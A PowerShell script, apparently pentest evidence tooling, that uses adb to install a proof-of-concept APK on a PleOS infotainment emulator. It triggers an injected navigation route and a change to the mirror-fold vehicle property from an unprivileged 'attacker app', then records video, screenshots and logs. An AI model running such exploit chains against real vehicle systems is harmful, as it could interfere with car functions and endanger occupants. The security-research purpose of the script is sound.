param(
    [string]$OutputDir = "data/_local/poc_evidence/chain-1_combined_app",
    [int]$Seconds = 70,
    [switch]$SkipBuild,
    [switch]$SkipInstall,
    [switch]$TapStartGuidance
)

$ErrorActionPreference = "Stop"

$RepoRoot = Split-Path -Parent $PSScriptRoot
$Python = "C:\Users\cabin\Miniconda3\python.exe"
if (-not (Test-Path $Python)) { $Python = "python" }

$HarnessScript = Join-Path $RepoRoot "scripts\research_runtime_poc_harness.py"
$HarnessApk = Join-Path $RepoRoot "data\runtime_poc_harness\poc-harness-signed.apk"
$Activity = "org.codex.pleos.poc/.PocActivity"
$ChainAction = "org.codex.pleos.poc.CHAIN_UI"
$RunStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$RunDir = Join-Path (Join-Path $RepoRoot $OutputDir) ("live_replay_" + $RunStamp)
$RemoteVideo = "/sdcard/codex_combined_ivi_chain_demo.mp4"

New-Item -ItemType Directory -Force -Path $RunDir | Out-Null

function Invoke-Adb([string[]]$AdbArgs) {
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    try {
        $output = & adb @AdbArgs 2>&1 | Out-String
        return $output.Trim()
    } finally {
        $ErrorActionPreference = $oldPreference
    }
}

function Wait-Boot {
    $deadline = (Get-Date).AddSeconds(180)
    do {
        $state = ""
        try { $state = (Invoke-Adb @("get-state")).Trim() } catch { $state = "" }
        if ($state -eq "device") {
            $boot = (Invoke-Adb @("shell", "getprop", "sys.boot_completed")).Trim()
            if ($boot -eq "1") { return }
        }
        Start-Sleep -Seconds 2
    } while ((Get-Date) -lt $deadline)
    throw "No booted adb device found. Start the PleOS emulator first."
}

function Save-Screenshot([string]$Name) {
    $path = Join-Path $RunDir $Name
    $cmdPath = $path.Replace("/", "\")
    cmd /c "adb exec-out screencap -p > `"$cmdPath`""
    return $path
}

function Dump-UiXml {
    Invoke-Adb @("shell", "uiautomator", "dump", "/sdcard/codex_chain_window.xml") | Out-Null
    return Invoke-Adb @("exec-out", "cat", "/sdcard/codex_chain_window.xml")
}

function Tap-UiText([string]$Text, [string]$FallbackTap = "") {
    $xml = Dump-UiXml
    $escaped = [regex]::Escape($Text)
    $pattern = "text=""$escaped""[^>]*bounds=""\[(\d+),(\d+)\]\[(\d+),(\d+)\]"""
    $match = [regex]::Match($xml, $pattern)
    if (-not $match.Success) {
        $pattern = "content-desc=""$escaped""[^>]*bounds=""\[(\d+),(\d+)\]\[(\d+),(\d+)\]"""
        $match = [regex]::Match($xml, $pattern)
    }
    if ($match.Success) {
        $x1 = [int]$match.Groups[1].Value
        $y1 = [int]$match.Groups[2].Value
        $x2 = [int]$match.Groups[3].Value
        $y2 = [int]$match.Groups[4].Value
        $x = [int](($x1 + $x2) / 2)
        $y = [int](($y1 + $y2) / 2)
        Invoke-Adb @("shell", "input", "tap", "$x", "$y") | Out-Null
        return "tap_text=$Text x=$x y=$y"
    }
    if ($FallbackTap.Length -gt 0) {
        $parts = $FallbackTap -split ","
        Invoke-Adb @("shell", "input", "tap", $parts[0], $parts[1]) | Out-Null
        return "tap_fallback=$Text x=$($parts[0]) y=$($parts[1])"
    }
    return "tap_failed=$Text"
}

function Tap-ButtonIndex([int]$Index, [string]$FallbackTap = "") {
    $xml = Dump-UiXml
    $matches = [regex]::Matches($xml, "class=""android\.widget\.Button""[^>]*bounds=""\[(\d+),(\d+)\]\[(\d+),(\d+)\]""")
    if ($matches.Count -ge $Index -and $Index -gt 0) {
        $match = $matches[$Index - 1]
        $x1 = [int]$match.Groups[1].Value
        $y1 = [int]$match.Groups[2].Value
        $x2 = [int]$match.Groups[3].Value
        $y2 = [int]$match.Groups[4].Value
        $x = [int](($x1 + $x2) / 2)
        $y = [int](($y1 + $y2) / 2)
        Invoke-Adb @("shell", "input", "tap", "$x", "$y") | Out-Null
        return "tap_button_index=$Index x=$x y=$y"
    }
    if ($FallbackTap.Length -gt 0) {
        $parts = $FallbackTap -split ","
        Invoke-Adb @("shell", "input", "tap", $parts[0], $parts[1]) | Out-Null
        return "tap_button_index_fallback=$Index x=$($parts[0]) y=$($parts[1])"
    }
    return "tap_button_index_failed=$Index"
}

function Tap-Coordinate([string]$Label, [int]$X, [int]$Y) {
    Invoke-Adb @("shell", "input", "tap", "$X", "$Y") | Out-Null
    return "tap_coordinate=$Label x=$X y=$Y"
}

function Reset-VisibleRouteState {
    # Best-effort cleanup for stale Maps route/guidance UI from a prior run.
    # Safe if the controls are absent: the fallback taps land on inert map space.
    Invoke-Adb @(
        "shell", "am", "start", "-W",
        "-n", $Activity,
        "-a", "org.codex.pleos.poc.NAVI_BINDER_PROBE",
        "--es", "navi_type", "RequestRouteCancel",
        "--es", "navi_tx", "request",
        "--es", "navi_payload", "{}"
    ) | Out-Null
    Start-Sleep -Seconds 4
    Tap-UiText "안내 종료" "402,1215" | Out-Null
    Start-Sleep -Seconds 1
    Tap-Coordinate "cleanup_route_popup_close_if_present" 535 165 | Out-Null
    Start-Sleep -Seconds 1
    Invoke-Adb @("shell", "am", "force-stop", "org.codex.pleos.poc") | Out-Null
}

function Start-ChainUi {
    Invoke-Adb @(
        "shell", "am", "start", "-W",
        "-n", $Activity,
        "-a", $ChainAction
    )
}

Push-Location $RepoRoot
try {
    if (-not $SkipBuild) {
        & $Python $HarnessScript --build
    }
    if (-not (Test-Path $HarnessApk)) {
        throw "Harness APK not found: $HarnessApk"
    }

    Wait-Boot

    if (-not $SkipInstall) {
        $installOut = Invoke-Adb @("install", "-r", $HarnessApk)
        if ($installOut -match "INSTALL_FAILED_UPDATE_INCOMPATIBLE") {
            $uninstallOut = Invoke-Adb @("uninstall", "org.codex.pleos.poc")
            $retryOut = Invoke-Adb @("install", "-r", $HarnessApk)
            @($installOut, $uninstallOut, $retryOut) | Set-Content -Encoding UTF8 (Join-Path $RunDir "install.txt")
        } else {
            @($installOut) | Set-Content -Encoding UTF8 (Join-Path $RunDir "install.txt")
        }
    }

    Invoke-Adb @("shell", "rm", "-f", $RemoteVideo) | Out-Null

    Reset-VisibleRouteState
    Invoke-Adb @("logcat", "-c") | Out-Null

    $rec = Start-Process -FilePath adb -ArgumentList @("shell", "screenrecord", "--time-limit", "$Seconds", $RemoteVideo) -PassThru -WindowStyle Hidden

    $steps = New-Object System.Collections.Generic.List[string]

    $steps.Add("[pre] close any stale Maps error dialog")
    $steps.Add((Tap-Coordinate "stale_maps_dialog_close_if_present" 1700 650))
    Start-Sleep -Seconds 1

    $steps.Add("[0] open attacker app Chain UI")
    Start-ChainUi | Set-Content -Encoding UTF8 (Join-Path $RunDir "start_chain_ui.txt")
    Start-Sleep -Seconds 2
    Save-Screenshot "01_attacker_app_home.png" | Out-Null

    $steps.Add("[1] tap attacker navigation button")
    $steps.Add((Tap-Coordinate "attacker_navigation_route_button" 1008 370))
    Start-Sleep -Seconds 10
    Save-Screenshot "02_route_preview_after_attacker_button.png" | Out-Null

    if ($TapStartGuidance) {
        $steps.Add("[2] demo continuation tap: visible start-guidance button")
        $steps.Add((Tap-UiText "START_GUIDANCE_BUTTON" "920,710"))
        Start-Sleep -Seconds 8
        Save-Screenshot "03_route_guidance_after_start_button.png" | Out-Null
    } else {
        $steps.Add("[2] start-guidance tap skipped; keep claim at route UI injection")
    }

    $steps.Add("[3] return to attacker app Chain UI")
    Start-ChainUi | Set-Content -Encoding UTF8 (Join-Path $RunDir "restart_chain_ui_for_vehicle.txt")
    Start-Sleep -Seconds 2
    Save-Screenshot "04_attacker_app_before_vehicle_button.png" | Out-Null

    $steps.Add("[4] tap attacker mirror-state button")
    $steps.Add((Tap-Coordinate "attacker_mirror_state_button" 1008 420))
    Start-Sleep -Seconds 7
    Save-Screenshot "05_vehicle_property_after_button.png" | Out-Null

    $logcat = Invoke-Adb @("logcat", "-d", "-t", "1200")
    ($logcat -split "`r?`n" |
        Select-String -Pattern "CodexPoc|Navi|RouteResponse|HACKED_MALICIOUS_DEST|VS1_|CHAIN_UI|RouteRequest|findPath|Pentest|GEAR_POSITION|0x21400400" |
        ForEach-Object { $_.Line }) | Set-Content -Encoding UTF8 (Join-Path $RunDir "combined_demo_logcat_filtered.txt")
    $steps | Set-Content -Encoding UTF8 (Join-Path $RunDir "scenario_steps.txt")

    $waitMs = [Math]::Max(5000, ($Seconds + 5) * 1000)
    if (-not $rec.HasExited) {
        try { $rec.WaitForExit($waitMs) | Out-Null } catch {}
    }
    if (-not $rec.HasExited) {
        try { Stop-Process -Id $rec.Id -Force } catch {}
        throw "screenrecord did not finish within timeout; not pulling a potentially corrupt MP4"
    }
    Start-Sleep -Seconds 1
    Invoke-Adb @("pull", $RemoteVideo, (Join-Path $RunDir "combined_ivi_chain_demo.mp4")) | Set-Content -Encoding UTF8 (Join-Path $RunDir "pull_video.txt")

    @(
        '# Combined IVI Chain Demo Live Replay',
        '',
        'This run records the actual scenario instead of inserting old screenshots into the story.',
        '',
        '## Scenario',
        '',
        '1. Open attacker app UI.',
        '2. Tap the navigation button in the attacker app.',
        '3. The app sends RequestRoute through exported NaviService Binder.',
        '4. Capture Maps route preview for HACKED_MALICIOUS_DEST.',
        '5. Optional: tap the visible start-guidance button only as demo continuation. Do not claim attacker-triggered automatic guidance unless separately proven.',
        '6. Return to the attacker app.',
        '7. Tap the mirror-fold vehicle-property button.',
        '8. Capture VehicleService MIRROR_FOLD before/set/after/restore evidence.',
        '',
        '## Outputs',
        '',
        '- combined_ivi_chain_demo.mp4',
        '- 01_attacker_app_home.png',
        '- 02_route_preview_after_attacker_button.png',
        '- 03_route_guidance_after_start_button.png if -TapStartGuidance was used',
        '- 04_attacker_app_before_vehicle_button.png',
        '- 05_vehicle_property_after_button.png',
        '- combined_demo_logcat_filtered.txt',
        '- scenario_steps.txt',
        '',
        '## Allowed Claim',
        '',
        'A same-device unprivileged app can trigger a visible route preview through NaviService and can mutate the reversible MIRROR_FOLD vehicle property through weakly protected VehicleService. The attached pentest evidence separately demonstrates emulator VHAL GEAR_POSITION spoofing through ADB-root car_service injection.',
        '',
        '## Not Claimed',
        '',
        '- no remote takeover',
        '- no autonomous-driving takeover',
        '- no active-route hijack',
        '- no attacker-triggered automatic guidance start unless separately proven',
        '- no steering/brake/gear/powertrain control'
    ) | Set-Content -Encoding UTF8 (Join-Path $RunDir "README.md")

    Write-Output "Run directory: $RunDir"
} finally {
    Pop-Location
}
